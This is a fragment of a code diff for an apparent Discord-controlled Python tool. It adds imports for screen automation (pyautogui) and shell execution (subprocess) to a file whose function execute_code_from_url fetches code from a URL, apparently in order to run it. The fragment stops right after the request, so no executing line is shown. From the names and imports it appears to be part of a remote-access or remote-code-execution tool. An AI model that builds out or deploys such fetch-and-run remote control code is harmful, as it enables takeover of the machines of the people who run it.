@@ -1,5 +1,9 @@
 import discord
 import requests
+import os
+import pyautogui
+import time
+import subprocess
 
 def execute_code_from_url(url, client=None):
     response = requests.get(url)
